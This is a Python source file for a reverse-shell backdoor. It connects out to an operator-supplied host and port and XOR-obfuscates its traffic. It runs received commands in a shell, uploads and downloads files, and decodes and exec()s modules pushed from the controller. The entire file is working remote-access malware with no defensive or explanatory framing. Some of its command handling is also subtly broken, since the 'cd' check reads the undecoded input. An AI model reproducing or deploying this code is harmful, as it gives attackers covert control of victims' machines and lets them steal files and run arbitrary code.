#!/usr/bin/env python
#!/usr/bin/env python
import os, sys, re, signal
import socket
import time
from base64 import *
from subprocess import Popen,PIPE,STDOUT,call


socksize = 4096                            
activePID = []
Home_Dir = os.environ['HOME']
if os.geteuid() != 0:
    currentuser = "nonroot"
else:
    currentuser = "root"


def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data


def module_handler(module, modname):
    status_msg("[~] Module: %s\n" % modname)
    exec(module)
    connection.send("shell => ")


def status_msg(message):
    connection.send("%s" % message)


def cat_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        catfile = open(filename, "rb")
        connection.send("[*] Contents of %s" % filename)
        for lines in catfile.readlines():
            connection.sendall(lines)
        catfile.close()


def save_file(filename):
    if os.path.exists(filename) and os.access(filename, os.R_OK):
        savefile = open(filename, "rb")
        filedata = savefile.read()
        savefile.close()
        connection.send(":savef %s" % filename)
        time.sleep(2)
        connection.sendall( filedata )
    else:
        pass


def cmd_exec(command):
    proc = Popen(command,
              shell=True,
              stdout=PIPE,
              stderr=PIPE,
               stdin=PIPE,
               )
    stdout, stderr = proc.communicate()
    connection.sendall( stdout )


def cmd2txt(command, textfile):
    os.system("%s > %s" % (command, textfile))
    save_file(textfile)
    os.system("rm %s" % textfile)


def main(HOST, PORT, pin):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        connection.connect((HOST, PORT))
        connection.send(xor("shell => ", pin))
    except:
        sys.exit(2)
                                        
    while True:                                     
        cmd = connection.recv(socksize)
        cmd2 = xor(cmd, pin)
        proc = Popen(cmd2,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
            try:
                destination = cmd[3:].replace('\n','')
                if os.path.isdir(destination):
                    os.chdir(destination)
                    current = os.getcwd()
                    connection.send("[*] current directory: %s" % current)
                    connection.send("shell => ")
                else:
                    connection.send("[!] Directory does not exist") 
                    connection.send("shell => ")
            except IndexError:
                pass

        if cmd2.startswith(":upload"):
            getname = cmd2.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = connection.recv(socksize)
            filedata = xor(filedata, pin)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                connection.send(xor("[~] File upload complete!\n", pin))
            if not os.path.isfile(filename):
                connection.send(xor("[!] File upload failed! Please try again\n", pin))

        elif cmd2.startswith(":download"):
            getname = cmd2.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                senddata = xor(filedata, pin)
                connection.sendall(senddata)
            else:
                connection.send(xor("[!] File not found!", pin))
    
        elif cmd2.startswith(":exec"):
            try:
                getname = cmd2.split(" ")        # split mod name from cmd
                modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
    
                mod_data = ""                   # Our received file data will go here 
                data = connection.recv(socksize)
                mod_data += data
                #print("[+] Module recieved!")
                connection.send(xor("Complete", pin))     # sends OK msg to the client
                modexec = b64decode(mod_data)   # decode the received file
                module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client

            except IndexError:
                pass

        elif cmd2 == (":quit"):
            connection.close()
            os._exit(0)
            sys.exit(0)

        elif proc:
            connection.send(xor( stdout , pin))
            connection.send(xor("shell => ", pin))

    connection.close() 
    os._exit(0)


